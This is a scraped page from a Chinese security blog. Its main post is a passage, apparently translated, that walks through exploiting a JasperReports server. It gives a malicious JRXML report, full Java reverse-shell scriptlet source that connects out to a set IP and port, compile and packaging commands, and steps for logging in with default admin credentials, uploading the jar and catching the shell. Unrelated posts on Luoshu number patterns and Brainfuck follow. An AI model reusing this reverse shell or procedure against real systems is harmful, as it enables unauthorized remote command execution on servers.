class="attr">value</span>=<span class="string">"2"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Name"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"23562605-5611-41d8-8a40-98ad9d28834a"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;name&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">uuid</span>=<span class="string">"4612e5a3-cb0d-4533-9b54-9ad9828acbed"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"d81f1db2-9f2e-4665-aa47-3d1a49cc9d15"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"10"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Phone"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"e48d7dee-a092-45ea-8bd8-8440f76a9fd0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;phone_office&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">uuid</span>=<span class="string">"f0397b7d-4130-4b13-88b1-d89415b269bd"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"0a1206b8-d0d6-4809-a424-3d7f09606b44"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Address"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"7bc63c7e-0224-441b-96ec-8a1bb67a0b84"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_street&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnGroup</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:table</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">componentElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">summary</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jasperReport</span>&gt;</span></div><div class="line"></div><div class="line">接下来看42行：</div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"></div><div class="line">这里我们调用一个getshell的方法在ShellScriptlet_SCRIPTLET。在35行我们定义了一个ShellScriptlet_SCRIPTLET 来引用“foxglove.shell.ShellScriptlet”中的Java代码。</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></div></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div></pre></td><td class="code"><pre><div class="line">这很简单,但这在Java代码本身是如何定义的呢?</div><div class="line"></div><div class="line">编写攻击脚本</div><div class="line"></div><div class="line">scriptlet用Java编写,需要去扩展“JRDefaultScriptlet”。我从<span class="string">"here"</span>中借用了一些Java代码来反弹shell并且让这种攻击脚本成为跨平台的。下面就是结果了，要注意“host”和“port”的写法是固定的：</div><div class="line"></div><div class="line"><span class="keyword">package</span> foxglove.shell;</div><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"><span class="keyword">import</span> java.net.*;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.OutputStream;</div><div class="line"><span class="keyword">import</span> java.io.DataInputStream;</div><div class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRDefaultScriptlet;</div><div class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRScriptletException;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellScriptlet</span> <span class="keyword">extends</span> <span class="title">JRDefaultScriptlet</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</div><div class="line">   Socket socket;</div><div class="line"> </div><div class="line">   PrintWriter socketWrite;</div><div class="line">   BufferedReader socketRead;</div><div class="line"> </div><div class="line">   PrintWriter commandWrite;</div><div class="line">   BufferedReader commandRead;</div><div class="line"> </div><div class="line">   <span class="keyword">static</span> String ip;</div><div class="line">   <span class="keyword">int</span> port = <span class="number">8080</span>;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getShell</span><span class="params">()</span></span>&#123;</div><div class="line">      ip = <span class="string">"1.1.1.1"</span>;</div><div class="line">      ShellScriptlet shell = <span class="keyword">new</span> ShellScriptlet();</div><div class="line">      shell.establishConnection();</div><div class="line">      <span class="keyword">new</span> Thread(shell).start();</div><div class="line">      shell.getCommand();</div><div class="line">      <span class="keyword">return</span> <span class="string">"DONE"</span>;</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</div><div class="line">      spawnShell();</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">spawnShell</span><span class="params">()</span></span>&#123;</div><div class="line">      <span class="keyword">boolean</span> windows = <span class="keyword">false</span>;</div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         <span class="keyword">if</span> ( System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) != -<span class="number">1</span>)&#123;</div><div class="line">            windows = <span class="keyword">true</span>;</div><div class="line">         &#125;</div><div class="line"> </div><div class="line">         Runtime rt = Runtime.getRuntime();</div><div class="line">         Process p;</div><div class="line">         <span class="keyword">if</span>(windows) p = rt.exec(<span class="string">"C:\\Windows\\System32\\cmd.exe"</span>);</div><div class="line">         <span class="keyword">else</span> p = rt.exec(<span class="string">"/bin/sh"</span>);</div><div class="line"> </div><div class="line">         InputStream readme = p.getInputStream();</div><div class="line">         OutputStream writeme = p.getOutputStream();</div><div class="line">         commandWrite = <span class="keyword">new</span> PrintWriter(writeme);</div><div class="line">         commandRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(readme));</div><div class="line"> </div><div class="line">         <span class="keyword">if</span>(windows) commandWrite.println(<span class="string">"dir"</span>);</div><div class="line">         <span class="keyword">else</span> commandWrite.println(<span class="string">"ls -al"</span>);</div><div class="line"> </div><div class="line">         commandWrite.flush();</div><div class="line"> </div><div class="line">         String line;</div><div class="line">         <span class="keyword">while</span>((line = commandRead.readLine()) != <span class="keyword">null</span>)&#123;</div><div class="line">            socketWrite.println(line);</div><div class="line">            socketWrite.flush();</div><div class="line">         &#125;</div><div class="line"> </div><div class="line">         p.destroy();</div><div class="line"> </div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line"> </div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">establishConnection</span><span class="params">()</span></span>&#123;</div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         socket = <span class="keyword">new</span> Socket(ip,port);</div><div class="line">         socketWrite = <span class="keyword">new</span> PrintWriter(socket.getOutputStream(),<span class="keyword">true</span>);</div><div class="line">         socketRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(socket.getInputStream()));</div><div class="line">         socketWrite.println(<span class="string">"---Connection has been established---"</span>);</div><div class="line">         socketWrite.flush();</div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line"> </div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getCommand</span><span class="params">()</span></span>&#123;</div><div class="line">      String foo;</div><div class="line"> </div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         <span class="keyword">while</span>((foo=socketRead.readLine())!= <span class="keyword">null</span>)&#123;</div><div class="line">            commandWrite.println(foo);</div><div class="line">            commandWrite.flush();</div><div class="line">         &#125;</div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</div><div class="line">      ShellScriptlet r = <span class="keyword">new</span> ShellScriptlet();</div><div class="line">      r.getShell();</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>对于那些不熟悉Java的,你可以用下面的命令编译在相同的目录中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/javac -Xlint -cp .:jasperreports-5.0.0.jar *.java -d .</div></pre></td></tr></table></figure>
<p>这里指定” javac “的完整路径是有原因的(这是Java 1.6)。如果你运行这个命令对某种系统会出错,你需要考虑理想情况下用相同的环境来编译它，至少不是最新的版本！</p>
<p>接下来我们要做的就是把所有的代码打包趁有个jar文件然后上传到目标站点。你可以使用下面这个代码来完成它：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/jar cvf shell.jar foxglove/</div></pre></td></tr></table></figure>
<p>如果一切进行的顺利，你就会得到个“shell.jar”文件，接下来就准备上传这个到目标站点吧！</p>
<h4 id="部署这个新的“Report”"><a href="#部署这个新的“Report”" class="headerlink" title="部署这个新的“Report”"></a>部署这个新的“Report”</h4><p>每个版本的JasperReports似乎都有些不同，但是他们都有相同的函数和工作流。</p>
<p>首先很明显我们要去验证一下“jasperadmin/jasperadmin”：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/authd.png?w=960" alt="authd.png"></p>
<p>在我这个版本中，这就立即显示出了有一堆reports样例的“Repository”（要确保“Type”这一列说的是“Report”）。</p>
<p>接下来，我们只要右击一个report并且点击“Edit”就好。</p>
<p>一开始，就点击 “Controls and Resources” 之后点击“Add Resource”。上传我们之前创建的JAR文件并给这个资源命名为“ShellScriptlet”。结束之后我们应该可以看到下图这样的结果：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resource.png?w=960" alt="resource.png"></p>
<p>点击左侧栏的“Set Up”，单击 “Upload a Local file”把我们之前创建的JRXML文件上传了。你应该可以得到下图所示的结果：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resources2.png?w=960" alt="resources2"></p>
<p>Jasper 现在让我们去定义一些我们在JRXML文件引用的资源。如果你是一个keener你可能会仅仅把这些资源从JRXML文件中删除。仅仅单击“Add Now”并且上传一些随机的PNG图片文件为你每一个引用资源…当你做完这些应该看起来像下图一样：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resourcesadded.png?w=960" alt="resourcesadded"></p>
<p>现在你只需要点击“Submit”在这个按钮来创建我们的恶意report就好了。哈哈</p>
<h4 id="Shellz"><a href="#Shellz" class="headerlink" title="Shellz!"></a>Shellz!</h4><p>先别激动，在你运行这个report之前，你还要开个监听端口去捕捉你的shell！！！<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/listener.png?w=960" alt="listener.png"></p>
<p>之后单击你创建的report，它将会运行Java代码，如果没有什么问题，你就可以看到反弹的shell了。</p>
<p><img src="https://foxglovesecurity.files.wordpress.com/2016/10/shell1.png?w=960" alt="shell"></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/洛书中的数字规律/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/洛书中的数字规律/" itemprop="url">
                  洛书中的数字规律
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:57:34+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/洛书中的数字规律/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/洛书中的数字规律/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/洛书中的数字规律/" class="leancloud_visitors" data-flag-title="洛书中的数字规律">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><img src="http://ok44mzy2k.bkt.clouddn.com/luoshu-1.png" alt="1"></p>
<h2 id="数字规律"><a href="#数字规律" class="headerlink" title="数字规律"></a>数字规律</h2><p><a href="undefined">编辑</a></p>
<p>那么<a href="http://baike.baidu.com/view/102528.htm" target="_blank" rel="external">河图洛书</a>中真的隐含着宇宙之理吗？其内容又是什么呢？我在这里只能先谈洛书，即<a href="http://baike.baidu.com/view/97444.htm" target="_blank" rel="external">九宫图</a>。把九宫图中的数字排列来进行详解一番，或可看出一定道理来。首先在九宫图中数字之和等于十五，这一点恐怕所有的人都知道，就是横坚斜相加都等于十五。</p>
<p>4+9+2=15</p>
<p>3+5+7=15</p>
<p>8+1+6=15</p>
<p>4+3+8=15</p>
<p>9+5+1=15</p>
<p>2+7+6=15</p>
<p>4+5+6=15</p>
<p>2+5+8=15</p>
<p>除此之外，还有什么数字玄机呢？</p>
<p>a+b+c=d+e+f</p>
<p>a^2+b^2+c^2=d^2+e^2+f^2</p>
<p>我们以左列的438与右列的276为例加以说明。当我们把数递变为两位数相加时，左右两列数字之和依然相等。即43+38+84=27+76+62。从下向上递变依然成立。即83+34+48=67+72+26。</p>
<p>递变为三位数依然相等，即438+384+843=276+762+627。</p>
<p>从下向上递数依然成立，即834+348+483=672+726+267。</p>
<p>再这样递变下去为四位数、五位数、六位数，一百位数、一千位数依然成立。神奇之处还不在这里，更为神奇的是不管是一位，还是两位数三位数的平方相加和依然可以左右相等。比如两位数即43^2+38^2+84^2=27^2+76^2+62^2。</p>
<p>三位数四位数平方和依然可以成立。也就是说一百位也好一千位也好都可以成立。这个数字的神奇排列真是让我莫名惊诧。</p>
<p>再有就是把九宫图用行列式的方法计算，可以得到一个周天数360。在这些数字面前，我不敢想象，这样一个数字排竟然有着不可思议的魔力。</p>
<p>det[4 ，9， 2；3，5，7；8，1，6]=360</p>
<p>就是这样的一个九宫数的排列解开了美国数学家提出的数学怪题，严格等平方和的问题，当时可是无人能解的数学怪题，就连计算机都无能为力。结果被研究洛书的彭绍定数学教授攻克。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/Brainfuck/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/Brainfuck/" itemprop="url">
                  Brainfuck
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:50:39+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/Brainfuck/#comments" itemprop="discussionUrl">
